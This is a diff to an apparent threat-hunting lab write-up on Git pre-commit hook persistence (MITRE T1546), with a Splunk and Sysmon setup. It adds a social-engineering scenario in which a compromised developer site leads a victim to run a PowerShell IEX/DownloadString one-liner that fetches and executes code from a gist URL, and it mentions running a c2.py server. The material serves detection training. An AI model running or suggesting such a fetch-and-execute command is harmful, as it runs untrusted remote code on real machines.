@@ -34,6 +34,31 @@ This hunt maps to MITRE ATT&CK `T1546` because the pre-commit hook executes auto
 | Victim | Windows 11 | 192.168.37.130 | Victim (Git + Sysmon) |
 | Splunk | Ubuntu Server | 192.168.37.129 | SIEM |
 
+## Scenario:
+
+
+A developer at IlikeTurtles was setting up a new project and visited 
+a popular developer tooling site to follow a guide on configuring their 
+local Git environment for CI/CD pipeline compatibility. Unknown to the 
+developer, the site had been compromised, the attacker had injected an 
+additional "prerequisite check" step into the setup guide.
+
+The page displayed the following instruction alongside legitimate 
+configuration steps:
+
+> **Verify Developer Environment Compliance**  
+> Before proceeding, run the following diagnostic to ensure your 
+> environment meets the required dependency versions:
+
+The developer, familiar with running setup commands from developer 
+documentation and seeing nothing unusual about the request, opened 
+PowerShell and ran the command as instructed:
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/ADZYYYY/d8dcb369797a119abbfba8880c0ebd70/raw/db44a34669ed92f91dfe0b0e28696771007522e3/gistfile1.txt')
+```
+
+
 ### Attack Simulation
 
 The attack was simulated manually as no Atomic Red Team test exists for this technique.
@@ -62,7 +87,8 @@ python3 c2.py
 
 
 
-**Step 2 — Social engineering delivery, User running "Audit script"**
+**Step 2 — Social engineering delivery, User running "Audit script" from a comprimised dev website **
+
 
 > **Note:** While this test describes a user being socially engineered, resulting in running a powershell command, the same persistence mechanism can be achieved through several other attack vectors that require no direct user interaction beyond normal developer activity.
 
